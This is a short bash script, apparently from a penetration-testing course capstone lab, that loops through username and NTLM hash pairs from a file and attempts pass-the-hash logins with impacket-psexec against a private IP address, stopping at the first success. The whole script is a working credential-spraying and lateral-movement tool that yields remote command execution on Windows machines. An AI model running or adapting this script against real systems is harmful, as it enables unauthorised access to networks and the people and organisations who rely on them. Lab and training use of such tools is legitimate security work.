#!/bin/bash

# Loop through each line in the text file
while read -r username hash; do
  
  # Execute impacket-psexec command
  impacket-psexec -hashes "$hash" "$username"@192.168.245.226
  
  # Check if the command was successful
  if [[ $? -eq 0 ]]; then
    echo "Successful login with $username and hash $hash."
    break
  else
    echo "Failed login with $username and hash $hash."
  fi
  
done < <(awk -F'\t' '{print $1, $2}' Ex20.4.1_Capstone-PassHash.txt)
